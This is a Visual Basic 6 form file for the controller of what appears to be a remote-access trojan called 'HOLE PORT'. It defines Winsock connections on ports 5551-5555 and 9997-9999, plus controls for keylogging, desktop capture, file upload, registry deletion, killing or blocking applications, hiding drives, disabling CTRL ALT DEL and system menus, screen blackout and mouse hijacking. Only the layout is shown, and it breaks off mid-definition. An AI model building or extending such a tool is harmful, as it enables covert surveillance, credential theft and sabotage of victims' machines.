VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{BDC217C8-ED16-11CD-956C-0000C04E4C0A}#1.1#0"; "TABCTL32.OCX"
Begin VB.Form client 
   AutoRedraw      =   -1  'True
   BackColor       =   &H80000001&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "HOLE PORT"
   ClientHeight    =   9480
   ClientLeft      =   45
   ClientTop       =   585
   ClientWidth     =   7365
   DrawWidth       =   5
   Icon            =   "client.frx":0000
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   OLEDropMode     =   1  'Manual
   ScaleHeight     =   9480
   ScaleWidth      =   7365
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   WhatsThisButton =   -1  'True
   WhatsThisHelp   =   -1  'True
   Begin MSWinsockLib.Winsock wskF 
      Left            =   3240
      Top             =   1080
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   5551
   End
   Begin MSWinsockLib.Winsock wskFL 
      Left            =   3840
      Top             =   1080
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   5553
   End
   Begin MSWinsockLib.Winsock wskKeys 
      Left            =   4320
      Top             =   1080
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   5554
   End
   Begin MSWinsockLib.Winsock wskWINT 
      Left            =   4800
      Top             =   1080
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   5555
   End
   Begin MSWinsockLib.Winsock wskEx 
      Left            =   5280
      Top             =   1080
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   9997
   End
   Begin MSWinsockLib.Winsock wskFile 
      Left            =   5760
      Top             =   1080
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   9998
   End
   Begin VB.PictureBox Picture3 
      AutoSize        =   -1  'True
      BackColor       =   &H80000004&
      FontTransparent =   0   'False
      Height          =   300
      Left            =   3240
      Picture         =   "client.frx":030A
      ScaleHeight     =   240
      ScaleWidth      =   240
      TabIndex        =   116
      Top             =   720
      Visible         =   0   'False
      Width           =   300
   End
   Begin VB.CommandButton Command20 
      Caption         =   "Close"
      Height          =   255
      Left            =   6120
      TabIndex        =   97
      Top             =   480
      Width           =   975
   End
   Begin MSComctlLib.StatusBar StatusBar1 
      Align           =   2  'Align Bottom
      Height          =   375
      Left            =   0
      TabIndex        =   96
      Top             =   9105
      Width           =   7365
      _ExtentX        =   12991
      _ExtentY        =   661
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
         NumPanels       =   1
         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
         EndProperty
      EndProperty
   End
   Begin MSComDlg.CommonDialog cmSave 
      Left            =   6240
      Top             =   1080
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Connect"
      Height          =   255
      Left            =   6120
      OLEDropMode     =   1  'Manual
      Style           =   1  'Graphical
      TabIndex        =   3
      Top             =   120
      Width           =   975
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H80000010&
      Caption         =   "Connection"
      Height          =   1455
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   3015
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   120
         TabIndex        =   1
         Top             =   240
         Width           =   2415
      End
   End
   Begin VB.Timer Timer1 
      Interval        =   300
      Left            =   6720
      Top             =   1080
   End
   Begin MSWinsockLib.Winsock wskClient 
      Left            =   120
      Top             =   2520
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   9999
   End
   Begin TabDlg.SSTab SSTab1 
      Height          =   7335
      Left            =   0
      TabIndex        =   2
      Top             =   1560
      Width           =   7125
      _ExtentX        =   12568
      _ExtentY        =   12938
      _Version        =   393216
      Tabs            =   7
      Tab             =   1
      TabHeight       =   520
      BackColor       =   -2147483632
      TabCaption(0)   =   "Other"
      TabPicture(0)   =   "client.frx":064C
      Tab(0).ControlEnabled=   0   'False
      Tab(0).Control(0)=   "Frame3"
      Tab(0).Control(1)=   "Frame2"
      Tab(0).ControlCount=   2
      TabCaption(1)   =   "Windows"
      TabPicture(1)   =   "client.frx":0668
      Tab(1).ControlEnabled=   -1  'True
      Tab(1).Control(0)=   "Label9"
      Tab(1).Control(0).Enabled=   0   'False
      Tab(1).Control(1)=   "Label10"
      Tab(1).Control(1).Enabled=   0   'False
      Tab(1).Control(2)=   "Label11"
      Tab(1).Control(2).Enabled=   0   'False
      Tab(1).Control(3)=   "Label12"
      Tab(1).Control(3).Enabled=   0   'False
      Tab(1).Control(4)=   "Label13"
      Tab(1).Control(4).Enabled=   0   'False
      Tab(1).Control(5)=   "Label14"
      Tab(1).Control(5).Enabled=   0   'False
      Tab(1).Control(6)=   "Label15"
      Tab(1).Control(6).Enabled=   0   'False
      Tab(1).Control(7)=   "Label16"
      Tab(1).Control(7).Enabled=   0   'False
      Tab(1).Control(8)=   "Command3"
      Tab(1).Control(8).Enabled=   0   'False
      Tab(1).Control(9)=   "Command5"
      Tab(1).Control(9).Enabled=   0   'False
      Tab(1).Control(10)=   "Command6"
      Tab(1).Control(10).Enabled=   0   'False
      Tab(1).Control(11)=   "Command7"
      Tab(1).Control(11).Enabled=   0   'False
      Tab(1).Control(12)=   "Command8"
      Tab(1).Control(12).Enabled=   0   'False
      Tab(1).Control(13)=   "Command9"
      Tab(1).Control(13).Enabled=   0   'False
      Tab(1).Control(14)=   "Command11"
      Tab(1).Control(14).Enabled=   0   'False
      Tab(1).Control(15)=   "txtURL"
      Tab(1).Control(15).Enabled=   0   'False
      Tab(1).Control(16)=   "Command4"
      Tab(1).Control(16).Enabled=   0   'False
      Tab(1).Control(17)=   "Command10"
      Tab(1).Control(17).Enabled=   0   'False
      Tab(1).Control(18)=   "Command14"
      Tab(1).Control(18).Enabled=   0   'False
      Tab(1).Control(19)=   "Command12"
      Tab(1).Control(19).Enabled=   0   'False
      Tab(1).Control(20)=   "Command15"
      Tab(1).Control(20).Enabled=   0   'False
      Tab(1).Control(21)=   "Command16"
      Tab(1).Control(21).Enabled=   0   'False
      Tab(1).Control(22)=   "Command2"
      Tab(1).Control(22).Enabled=   0   'False
      Tab(1).Control(23)=   "frmBeep"
      Tab(1).Control(23).Enabled=   0   'False
      Tab(1).Control(24)=   "Command24"
      Tab(1).Control(24).Enabled=   0   'False
      Tab(1).Control(25)=   "Frame11"
      Tab(1).Control(25).Enabled=   0   'False
      Tab(1).Control(26)=   "TimerM"
      Tab(1).Control(26).Enabled=   0   'False
      Tab(1).Control(27)=   "Command29"
      Tab(1).Control(27).Enabled=   0   'False
      Tab(1).Control(28)=   "Command31"
      Tab(1).Control(28).Enabled=   0   'False
      Tab(1).Control(29)=   "Command32"
      Tab(1).Control(29).Enabled=   0   'False
      Tab(1).Control(30)=   "Combo1"
      Tab(1).Control(30).Enabled=   0   'False
      Tab(1).Control(31)=   "Combo2"
      Tab(1).Control(31).Enabled=   0   'False
      Tab(1).Control(32)=   "Combo3"
      Tab(1).Control(32).Enabled=   0   'False
      Tab(1).Control(33)=   "Combo4"
      Tab(1).Control(33).Enabled=   0   'False
      Tab(1).Control(34)=   "Combo5"
      Tab(1).Control(34).Enabled=   0   'False
      Tab(1).Control(35)=   "Combo6"
      Tab(1).Control(35).Enabled=   0   'False
      Tab(1).Control(36)=   "Combo7"
      Tab(1).Control(36).Enabled=   0   'False
      Tab(1).Control(37)=   "Combo8"
      Tab(1).Control(37).Enabled=   0   'False
      Tab(1).ControlCount=   38
      TabCaption(2)   =   "Files"
      TabPicture(2)   =   "client.frx":0684
      Tab(2).ControlEnabled=   0   'False
      Tab(2).Control(0)=   "lblSize"
      Tab(2).Control(0).Enabled=   0   'False
      Tab(2).Control(1)=   "lstFiles"
      Tab(2).Control(1).Enabled=   0   'False
      Tab(2).Control(2)=   "Frame6"
      Tab(2).Control(2).Enabled=   0   'False
      Tab(2).Control(3)=   "ProgressBar1"
      Tab(2).Control(3).Enabled=   0   'False
      Tab(2).Control(4)=   "Command22"
      Tab(2).Control(4).Enabled=   0   'False
      Tab(2).Control(5)=   "Command23"
      Tab(2).Control(5).Enabled=   0   'False
      Tab(2).Control(6)=   "Command26"
      Tab(2).Control(6).Enabled=   0   'False
      Tab(2).ControlCount=   7
      TabCaption(3)   =   "Windows registry"
      TabPicture(3)   =   "client.frx":06A0
      Tab(3).ControlEnabled=   0   'False
      Tab(3).Control(0)=   "help1"
      Tab(3).Control(1)=   "help2"
      Tab(3).Control(2)=   "help3"
      Tab(3).Control(3)=   "help4"
      Tab(3).Control(4)=   "Frame4"
      Tab(3).ControlCount=   5
      TabCaption(4)   =   "Chat"
      TabPicture(4)   =   "client.frx":06BC
      Tab(4).ControlEnabled=   0   'False
      Tab(4).Control(0)=   "cmdErrMsg"
      Tab(4).Control(1)=   "txtErrorMsg"
      Tab(4).Control(2)=   "Frame5"
      Tab(4).ControlCount=   3
      TabCaption(5)   =   "Windows Threads"
      TabPicture(5)   =   "client.frx":06D8
      Tab(5).ControlEnabled=   0   'False
      Tab(5).Control(0)=   "Command33"
      Tab(5).Control(1)=   "Command30"
      Tab(5).Control(2)=   "cmdShow"
      Tab(5).Control(3)=   "cmdHide"
      Tab(5).Control(4)=   "cmdRef"
      Tab(5).Control(5)=   "List3"
      Tab(5).Control(6)=   "lblClass"
      Tab(5).Control(7)=   "lbltop1"
      Tab(5).Control(8)=   "lblbot"
      Tab(5).Control(9)=   "lblLeft"
      Tab(5).Control(10)=   "lblright"
      Tab(5).Control(11)=   "lblID"
      Tab(5).Control(12)=   "lblWinNum"
      Tab(5).ControlCount=   13
      TabCaption(6)   =   "Advanced "
      TabPicture(6)   =   "client.frx":06F4
      Tab(6).ControlEnabled=   0   'False
      Tab(6).Control(0)=   "Frame12"
      Tab(6).Control(1)=   "Frame10"
      Tab(6).Control(2)=   "Frame9"
      Tab(6).Control(3)=   "Frame8"
      Tab(6).Control(4)=   "Frame7"
      Tab(6).ControlCount=   5
      Begin VB.CommandButton Command33 
         Caption         =   "Destroy Ap."
         Height          =   375
         Left            =   -73560
         TabIndex        =   127
         Top             =   1200
         Width           =   855
      End
      Begin VB.ComboBox Combo8 
         Height          =   315
         Left            =   120
         TabIndex        =   126
         ToolTipText     =   "CTRL ALT DEL:"
         Top             =   3600
         Width           =   1815
      End
      Begin VB.ComboBox Combo7 
         Height          =   315
         Left            =   120
         TabIndex        =   125
         ToolTipText     =   "Screen blackout:"
         Top             =   5760
         Width           =   1815
      End
      Begin VB.ComboBox Combo6 
         Height          =   315
         Left            =   120
         TabIndex        =   124
         ToolTipText     =   "Windows toolbar:"
         Top             =   5400
         Width           =   1815
      End
      Begin VB.ComboBox Combo5 
         Height          =   315
         Left            =   120
         TabIndex        =   123
         ToolTipText     =   "Programs shown in taskbar:"
         Top             =   5040
         Width           =   1815
      End
      Begin VB.ComboBox Combo4 
         Height          =   315
         Left            =   120
         TabIndex        =   122
         ToolTipText     =   "Taskbar Icon:"
         Top             =   4680
         Width           =   1815
      End
      Begin VB.ComboBox Combo3 
         Height          =   315
         Left            =   120
         TabIndex        =   121
         ToolTipText     =   "TaskBar Clock:"
         Top             =   4320
         Width           =   1815
      End
      Begin VB.ComboBox Combo2 
         Height          =   315
         Left            =   120
         TabIndex        =   120
         ToolTipText     =   "Start button:"
         Top             =   3960
         Width           =   1815
      End
      Begin VB.ComboBox Combo1 
         Height          =   315
         Left            =   120
         TabIndex        =   119
         ToolTipText     =   "Taskbar:"
         Top             =   6120
         Width           =   1815
      End
      Begin VB.CommandButton Command32 
         Caption         =   "FREEZE"
         Height          =   375
         Left            =   3600
         TabIndex        =   118
         Top             =   1320
         Width           =   1335
      End
      Begin VB.CommandButton Command31 
         Caption         =   "Put a picture on the screen"
         Height          =   495
         Left            =   3600
         TabIndex        =   117
         Top             =   2280
         Width           =   1335
      End
      Begin VB.CommandButton Command30 
         Caption         =   "Block Ap."
         Height          =   255
         Left            =   -73560
         TabIndex        =   115
         Top             =   1680
         Width           =   855
      End
      Begin VB.CommandButton Command29 
         Caption         =   "Change Desktop"
         Height          =   375
         Left            =   3600
         TabIndex        =   114
         Top             =   1800
         Width           =   1335
      End
      Begin VB.Timer TimerM 
         Enabled         =   0   'False
         Interval        =   50
         Left            =   4560
         Top             =   1080
      End
      Begin VB.Frame Frame11 
         Caption         =   "Mouse Control"
         Height          =   1455
         Left            =   120
         TabIndex        =   106
         Top             =   1200
         Width           =   3255
         Begin VB.CommandButton Command28 
            Caption         =   "Stop"
            Height          =   255
            Left            =   120
            TabIndex        =   113
            Top             =   840
            Width           =   1215
         End
         Begin VB.CommandButton Command27 
            Caption         =   "Start"
            Height          =   255
            Left            =   120
            TabIndex        =   112
            Top             =   360
            Width           =   1215
         End
         Begin VB.TextBox txtY 
            Height          =   285
            Left            =   2160
            TabIndex        =   108
            Top             =   840
            Width           =   615
         End
         Begin VB.TextBox txtX 
            Height          =   285
            Left            =   2160
            TabIndex        =   107
            Top             =   360
            Width           =   615
         End
         Begin VB.Label LabelY 
            Caption         =   "Y:"
            Height          =   255
            Left            =   1920
            TabIndex        =   111
            Top             =   840
            Width           =   255
         End
         Begin VB.Label Label1 
            Caption         =   "X:"
            Height          =   255
            Left            =   1920
            TabIndex        =   109
            Top             =   360
            Width           =   255
         End
      End
      Begin VB.CommandButton Command26 
         Caption         =   "Explorer"
         Height          =   195
         Left            =   -70080
         TabIndex        =   105
         Top             =   1800
         Width           =   1215
      End
      Begin VB.CommandButton Command24 
         Caption         =   "KeyLog"
         Height          =   255
         Left            =   120
         TabIndex        =   100
         Top             =   2760
         Width           =   1335
      End
      Begin VB.CommandButton Command23 
         Caption         =   "Upload"
         Height          =   195
         Left            =   -70080
         TabIndex        =   99
         Top             =   1440
         Width           =   1215
      End
      Begin VB.CommandButton Command22 
         Caption         =   "Update "
         Height          =   195
         Left            =   -70080
         TabIndex        =   98
         Top             =   1080
         Width           =   1215
      End
      Begin MSComctlLib.ProgressBar ProgressBar1 
         Height          =   135
         Left            =   -74880
         TabIndex        =   95
         Top             =   3120
         Width           =   6495
         _ExtentX        =   11456
         _ExtentY        =   238
         _Version        =   393216
         Appearance      =   1
      End
      Begin VB.Frame Frame12 
         Caption         =   "Variables"
         Height          =   3495
         Left            =   -74760
         TabIndex        =   88
         Top             =   3600
         Width           =   3015
         Begin VB.CommandButton Command21 
            Caption         =   "Apply"
            Height          =   255
            Left            =   240
            TabIndex        =   93
            Top             =   2400
            Width           =   1215
         End
         Begin VB.TextBox txtValue 
            Height          =   285
            Left            =   240
            TabIndex        =   92
            Text            =   "Sunday,May 07,2000"
            Top             =   1920
            Width           =   2535
         End
         Begin VB.TextBox txtSubKey 
            Height          =   285
            Left            =   240
            TabIndex        =   91
            Text            =   "StringTestData"
            Top             =   1440
            Width           =   2535
         End
         Begin VB.TextBox txtPath 
            Height          =   285
            Left            =   240
            TabIndex        =   90
            Text            =   "System\Microsoft\Widnows"
            Top             =   960
            Width           =   2535
         End
         Begin VB.TextBox txtRoot 
            Height          =   285
            Left            =   240
            TabIndex        =   89
            Text            =   "HKEY_CURRENT_USER"
            Top             =   480
            Width           =   2535
         End
      End
      Begin VB.Frame Frame10 
         Caption         =   "Delete a Sub Key"
         Height          =   615
         Left            =   -71280
         TabIndex        =   86
         Top             =   2640
         Width           =   2895
         Begin VB.OptionButton optDSK 
            Caption         =   "Delete a sub Key"
            Height          =   255
            Left            =   120
            TabIndex        =   87
            Top             =   240
            Width           =   2655
         End
      End
      Begin VB.Frame Frame9 
         Caption         =   "Delete a Key"
         Height          =   615
         Left            =   -74760
         TabIndex        =   84
         Top             =   2640
         Width           =   3015
         Begin VB.OptionButton optDK 
            Caption         =   "Delete a key"
            Height          =   195
            Left            =   120
            TabIndex        =   85
            Top             =   240
            Width           =   2775
         End
      End
      Begin VB.Frame Frame8 
         Caption         =   "Create a key Value"
         Height          =   615
         Left            =   -71280
         TabIndex        =   82
         Top             =   1680
         Width           =   2895
         Begin VB.OptionButton optCrKV 
            Caption         =   "Create a key Value"
            Height          =   195
            Left            =   120
            TabIndex        =   83
            Top             =   240
            Width           =   2535
         End
      End
      Begin VB.Frame Frame7 
         Caption         =   "Create a Key"
         Height          =   615
         Left            =   -74760
         TabIndex        =   80
         Top             =   1680
         Width           =   3015
         Begin VB.OptionButton optCrK 
            Caption         =   "Create a key"
            Height          =   195
            Left            =   120
            TabIndex        =   81
            Top             =   240
            Width           =   2655
         End
      End
      Begin VB.Frame Frame6 
         Caption         =   "Files"
         Height          =   1935
         Left            =   -74880
         TabIndex        =   76
         Top             =   1020
         Width           =   4695
         Begin VB.CommandButton Command25 
            Caption         =   "Stop Search"
            Height          =   255
            Left            =   360
            TabIndex        =   129
            Top             =   1560
            Width           =   1095
         End
         Begin VB.ComboBox cmbDrive 
            Height          =   315
            Left            =   120
            TabIndex        =   128
            Text            =   "A:\"
            Top             =   600
            Width           =   1335
         End
         Begin VB.CommandButton Command18 
            Caption         =   "Clear the list"
            Height          =   255
            Left            =   1560
            TabIndex        =   79
            Top             =   1560
            Width           =   1215
         End
         Begin VB.CommandButton Command17 
            Caption         =   "Search"
            Height          =   255
            Left            =   2880
            TabIndex        =   78
            Top             =   1560
            Width           =   1095
         End
         Begin VB.TextBox txtPat 
            Height          =   285
            Left            =   120
            TabIndex        =   77
            Text            =   "Patern"
            Top             =   960
            Width           =   3855
         End
      End
      Begin VB.Frame frmBeep 
         Caption         =   "Beep"
         Height          =   1935
         Left            =   3480
         TabIndex        =   71
         Top             =   3960
         Width           =   3015
         Begin VB.CommandButton Command13 
            Caption         =   "Begin"
            Height          =   255
            Left            =   240
            TabIndex        =   74
            Top             =   1560
            Width           =   1215
         End
         Begin VB.TextBox txtDur 
            Height          =   285
            Left            =   240
            TabIndex        =   73
            Text            =   "Duration"
            Top             =   960
            Width           =   2535
         End
         Begin VB.TextBox txtFreq 
            Height          =   285
            Left            =   240
            TabIndex        =   72
            Text            =   "Frequency"
            Top             =   480
            Width           =   2535
         End
      End
      Begin VB.CommandButton cmdShow 
         Caption         =   "Pull up"
         Height          =   255
         Left            =   -73560
         TabIndex        =   62
         Top             =   2400
         Width           =   855
      End
      Begin VB.CommandButton cmdHide 
         Caption         =   "Hide"
         Height          =   315
         Left            =   -73560
         TabIndex        =   61
         Top             =   2760
         Width           =   855
      End
      Begin VB.CommandButton cmdRef 
         Caption         =   "Refresh"
         Height          =   315
         Left            =   -73560
         TabIndex        =   60
         Top             =   2040
         Width           =   855
      End
      Begin VB.ListBox List3 
         Height          =   5715
         ItemData        =   "client.frx":0710
         Left            =   -72600
         List            =   "client.frx":0712
         TabIndex        =   58
         Top             =   1140
         Width           =   4095
      End
      Begin VB.CommandButton Command2 
         Caption         =   "CaptureDesktop"
         Height          =   255
         Left            =   5160
         TabIndex        =   57
         Top             =   6600
         Width           =   1335
      End
      Begin VB.CommandButton cmdErrMsg 
         Caption         =   "Send"
         Height          =   255
         Left            =   -69360
         TabIndex        =   55
         Top             =   5460
         Width           =   855
      End
      Begin VB.TextBox txtErrorMsg 
         Height          =   375
         Left            =   -73560
         TabIndex        =   54
         Text            =   "SEND ERROR MESSAGES TO THE SERVER"
         Top             =   5340
         Width           =   4215
      End
      Begin VB.Frame Frame5 
         Caption         =   "Chat"
         Height          =   3735
         Left            =   -73560
         TabIndex        =   50
         Top             =   1260
         Width           =   4095
         Begin VB.CommandButton cmdSend 
            Caption         =   "Send"
            Height          =   255
            Left            =   120
            TabIndex        =   53
            Top             =   3000
            Width           =   855
         End
         Begin VB.TextBox txtAns 
            Height          =   975
            Left            =   240
            TabIndex        =   52
            Top             =   1680
            Width           =   3735
         End
         Begin VB.TextBox txtMsg 
            Height          =   975
            Left            =   240
            Locked          =   -1  'True
            MultiLine       =   -1  'True
            TabIndex        =   51
            Top             =   480
            Width           =   3735
         End
      End
      Begin VB.Frame Frame4 
         Caption         =   "Disable "
         Height          =   4215
         Left            =   -74640
         TabIndex        =   39
         Top             =   1500
         Width           =   6015
         Begin VB.CheckBox Check3 
            Caption         =   "Hide D:\ drive"
            Height          =   255
            Left            =   120
            TabIndex        =   104
            Top             =   2760
            Width           =   2415
         End
         Begin VB.CheckBox Check2 
            Caption         =   "Hide C:\ drive"
            Height          =   195
            Left            =   120
            TabIndex        =   103
            Top             =   3120
            Width           =   2415
         End
         Begin VB.CheckBox Check1 
            Caption         =   "Hide A:\ drive"
            Height          =   195
            Left            =   120
            TabIndex        =   102
            Top             =   3480
            Width           =   2895
         End
         Begin VB.TextBox Text2 
            Height          =   285
            Left            =   2880
            TabIndex        =   101
            ToolTipText     =   "Enter text you wish to show near their clock...."
            Top             =   2160
            Width           =   3015
         End
         Begin VB.OptionButton Option1 
            Caption         =   "Delete value in WIN REGISTRY"
            Height          =   375
            Left            =   2760
            TabIndex        =   56
            Top             =   1440
            Width           =   3135
         End
         Begin VB.CommandButton Command19 
            Caption         =   "Proceed"
            Height          =   255
            Left            =   5160
            TabIndex        =   49
            Top             =   1920
            Width           =   735
         End
         Begin VB.CheckBox RecentHistory 
            Caption         =   "Disable Recent Docs History"
            Height          =   255
            Left            =   2760
            TabIndex        =   48
            Top             =   1080
            Width           =   2535
         End
         Begin VB.CheckBox CTMenu 
            Caption         =   "Control Panel/Printers Menu"
            Height          =   255
            Left            =   2760
            TabIndex        =   47
            Top             =   720
            Width           =   2655
         End
         Begin VB.CheckBox Runmenu 
            Caption         =   "Run Menu"
            Height          =   255
            Left            =   2760
            TabIndex        =   46
            Top             =   360
            Width           =   2415
         End
         Begin VB.CheckBox RecentDocsMenu 
            Caption         =   "Recent Documents Menu"
            Height          =   255
            Left            =   120
            TabIndex        =   45
            Top             =   2160
            Width           =   2535
         End
         Begin VB.CheckBox Logoff 
            Caption         =   "Logoff Menu"
            Height          =   255
            Left            =   120
            TabIndex        =   44
            Top             =   1800
            Width           =   2295
         End
         Begin VB.CheckBox FindMenu 
            Caption         =   "Find Menu"
            Height          =   255
            Left            =   120
            TabIndex        =   43
            Top             =   1440
            Width           =   2535
         End
         Begin VB.CheckBox FavMenu 
            Caption         =   "Favorites Menu"
            Height          =   255
            Left            =   120
            TabIndex        =   42
            Top             =   1080
            Width           =   2655
         End
         Begin VB.CheckBox Shutdown 
            Caption         =   "Shutdown Menu"
            Height          =   255
            Left            =   120
            TabIndex        =   41
            Top             =   720
            Width           =   2415
         End
         Begin VB.CheckBox ClearDocs 
            Caption         =   "Clear Recent Docs On Exit"
            Height          =   255
            Left            =   120
            TabIndex        =   40
            Top             =   360
            Width           =   2655
         End
      End
      Begin VB.ListBox lstFiles 
         Height          =   3960
         ItemData        =   "client.frx":0714
         Left            =   -74880
         List            =   "client.frx":0716
         Sorted          =   -1  'True
         TabIndex        =   34
         Top             =   3300
         Width           =   6735
      End
      Begin VB.CommandButton Command16 
         Caption         =   "Swap mouse buttons"
         Height          =   495
         Left            =   5160
         TabIndex        =   33
         Top             =   3480
         Width           =   1335
      End
      Begin VB.CommandButton Command15 
         Caption         =   "Open and Close CD drive"
         Height          =   495
         Left            =   3600
         TabIndex        =   32
         Top             =   3480
         Width           =   1335
      End
      Begin VB.CommandButton Command12 
         Caption         =   "Load URL"
         Height          =   255
         Left            =   2280
         TabIndex        =   31
         Top             =   6660
         Width           =   975
      End
      Begin VB.CommandButton Command14 
         Caption         =   "Random Mouse move"
         Height          =   495
         Left            =   3600
         TabIndex        =   30
         Top             =   2880
         Width           =   1335
      End
      Begin VB.CommandButton Command10 
         Caption         =   "Change Resolution to 800 * 600"
         Height          =   615
         Left            =   5160
         TabIndex        =   29
         Top             =   2040
         Width           =   1335
      End
      Begin VB.CommandButton Command4 
         Caption         =   "Shutdown"
         Height          =   255
         Left            =   1560
         TabIndex        =   28
         Top             =   2760
         Width           =   1335
      End
      Begin VB.TextBox txtURL 
         Height          =   285
         Left            =   120
         TabIndex        =   27
         Text            =   "http://aokgame.8k.com"
         Top             =   6660
         Width           =   2055
      End
      Begin VB.CommandButton Command11 
         Caption         =   "Change Resolution to 1024 * 768"
         Height          =   615
         Left            =   5160
         TabIndex        =   26
         Top             =   1320
         Width           =   1335
      End
      Begin VB.CommandButton Command9 
         Caption         =   "Change Resolution to 640 * 460"
         Height          =   615
         Left            =   5160
         TabIndex        =   25
         Top             =   2760
         Width           =   1335
      End
      Begin VB.CommandButton Command8 
         Caption         =   "Restore Mouse"
         Height          =   255
         Left            =   5160
         TabIndex        =   24
         Top             =   6120
         Width           =   1335
      End
      Begin VB.CommandButton Command7 
         Caption         =   "Show Mouse"
         Height          =   255
         Left            =   3480
         TabIndex        =   23
         Top             =   6600
         Width           =   1335
      End
      Begin VB.CommandButton Command6 
         Caption         =   "Hide Mouse"
         Height          =   255
         Left            =   3480
         TabIndex        =   22
         Top             =   6120
         Width           =   1335
      End
      Begin VB.CommandButton Command5 
         Caption         =   "Logoff"
         Height          =   255
         Left            =   1560
         TabIndex        =   21
         Top             =   3240
         Width           =   1335
      End
      Begin VB.CommandButton Command3 
         Caption         =   "Restart"
         Height          =   255
         Left            =   120
         TabIndex        =   20
         Top             =   3240
         Width           =   1335
      End
      Begin VB.Frame Frame3 
         Caption         =   "Hostname to IP"
         Height          =   3135
         Left            =   -72240
         TabIndex        =   12
         Top             =   3600
         Width           =   2535
         Begin VB.CommandButton cmdResolveIp 
            Caption         =   "Resolve IP Addresses"
            Height          =   375
            Left            =   120
            TabIndex        =   16
            Top             =   1800
            Width           =   2175
         End
         Begin VB.TextBox txtHostname 
            Height          =   285
            Left            =   120
            TabIndex        =   15
            Text            =   "www.microsoft.com"
            Top             =   480
            Width           =   2175
         End
         Begin VB.ListBox lstResolvedAddress 
            Height          =   450
            Left            =   120
            TabIndex        =   14
            Top             =   1200
            Width           =   2175
         End
         Begin VB.CommandButton cmdPingHostname 
            Caption         =   "Ping Hostname"
            Height          =   375
            Left            =   120
            TabIndex        =   13
            Top             =   2280
            Width           =   2175
         End
         Begin VB.Label Label6 
            AutoSize        =   -1  'True
            Caption         =   "Resolved IP Addresses"
            Height          =   195
            Left            =   120
            TabIndex        =   19
            Top             =   960
            Width           =   1650
         End
         Begin VB.Label Label5 
            AutoSize        =   -1  'True
            Caption         =   "Enter Hostname"
            Height          =   195
            Left            =   120
            TabIndex        =   18
            Top             =   240
            Width           =   1140
         End
         Begin VB.Label lblHostPingState 
            AutoSize        =   -1  'True
            Caption         =   "Ping State:"
            Height          =   195
            Left            =   120
            TabIndex        =   17
            Top             =   2760
            Width           =   780
         End
      End
      Begin VB.Frame Frame2 
         Caption         =   "IP to Hostname"
         Height          =   3135
         Left            =   -74880
         TabIndex        =   4
         Top             =   3600
         Width           =   2535
         Begin VB.TextBox txtIpAddress 
            Height          =   285
            Left            =   120
            TabIndex        =   8
            Text            =   "207.46.131.137"
            Top             =   480
            Width           =   2175
         End
         Begin VB.TextBox txtResolvedHostname 
            Height          =   285
            Left            =   120
            TabIndex        =   7
            Top             =   1200
            Width           =   2175
         End
         Begin VB.CommandButton cmbResolveHostname 
            Caption         =   "Resolve Hostname"
            Height          =   375
            Left            =   120
            TabIndex        =   6
            Top             =   1800
            Width           =   2175
         End
         Begin VB.CommandButton cmdPingIp 
            Caption         =   "Ping IP Address"
            Height          =   375
            Left            =   120
            TabIndex        =   5
            Top             =   2280
            Width           =   2175
         End
         Begin VB.Label Label4 
            AutoSize        =   -1  'True
            Caption         =   "Enter IP Address"
            Height          =   195
            Left            =   120
            TabIndex        =   11
            Top             =   240
            Width           =   1185
         End
         Begin VB.Label Label2 
            AutoSize        =   -1  'True
            Caption         =   "Resolved Hostname"
            Height          =   195
            Left            =   120
            TabIndex        =   10
            Top             =   960
            Width           =   1440
         End
         Begin VB.Label lblIpPingState 
            AutoSize        =   -1  'True
            Caption         =   "Ping State:"
            Height          =   195
            Left            =   120
            TabIndex        =   9
            Top             =   2760
            Width           =   780
         End
      End
      Begin VB.Label Label16 
         Caption         =   "Taskbar:"
         Height          =   255
         Left            =   1920
         TabIndex        =   137
         Top             =   6120
         Width           =   1335
      End
      Begin VB.Label Label15 
         Caption         =   "Screen blackout:"
         Height          =   255
         Left            =   1920
         TabIndex        =   136
         Top             =   5760
         Width           =   1575
      End
      Begin VB.Label Label14 
         Caption         =   "Windows toolbar:"
         Height          =   255
         Left            =   1920
         TabIndex        =   135
         Top             =   5400
         Width           =   1455
      End
      Begin VB.Label Label13 
         Caption         =   "Programs shown in taskbar:"
         Height          =   375
         Left            =   1920
         TabIndex        =   134
         Top             =   5040
         Width           =   1695
      End
      Begin VB.Label Label12 
         Caption         =   "Taskbar Icon:"
         Height          =   255
         Left            =   1920
         TabIndex        =   133
         Top             =   4680
         Width           =   1455
      End
      Begin VB.Label Label11 
         Caption         =   "TaskBar Clock:"
         Height          =   255
         Left            =   1920
         TabIndex        =   132
         Top             =   4320
         Width           =   1575
      End
      Begin VB.Label Label10 
         Caption         =   "Start button:"
         Height          =   255
         Left            =   1920
         TabIndex        =   131
         Top             =   3960
         Width           =   1575
      End
      Begin VB.Label Label9 
         Caption         =   "CTRL ALT DEL:"
         Height          =   255
         Left            =   1920
         TabIndex        =   130
         Top             =   3600
         Width           =   1455
      End
      Begin VB.Label lblSize 
         Height          =   255
         Left            =   -70080
